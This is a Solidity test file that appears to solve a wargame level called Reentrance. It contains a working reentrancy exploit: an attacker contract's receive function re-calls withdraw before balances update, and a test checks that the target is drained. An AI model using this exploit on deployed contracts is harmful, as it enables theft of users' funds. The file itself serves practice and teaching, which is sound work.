// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Attack.sol";
import "./Reentrance.sol";

contract Attacker {
  Reentrance private _reentrance;

  constructor(Reentrance reentrance) {
    _reentrance = reentrance;
  }

  function attack() public payable {
    _reentrance.withdraw(1 ether);
  }

  receive() external payable {
    if (address(_reentrance).balance > 1) {
      _reentrance.withdraw(1 ether); // re-enter, contract has not subtracted our balance yet.
    }
  }
}

contract ReentranceAttack is Attack {
  Reentrance private _reentrance;
  Attacker private _attacker;

  function setUp() public {
    vm.prank(owner);
    _reentrance = new Reentrance();
    payable(address(_reentrance)).transfer(10 ether);
  }

  function test_attack() public {
    vm.startPrank(attacker);

    _attacker = new Attacker(_reentrance);

    _reentrance.donate{value: 1 ether}(address(_attacker));

    _attacker.attack();

    /*** Validation ***/
    assertFinished(address(_reentrance));
  }

  receive() external payable {
    if (address(_reentrance).balance > 1) {
      _reentrance.withdraw(1 ether);
    }
  }

  function validateInstance(address payable _instance, address _player) override public returns (bool) {
    _player;
    Reentrance instance = Reentrance(_instance);
    return address(instance).balance == 0;
  }
}
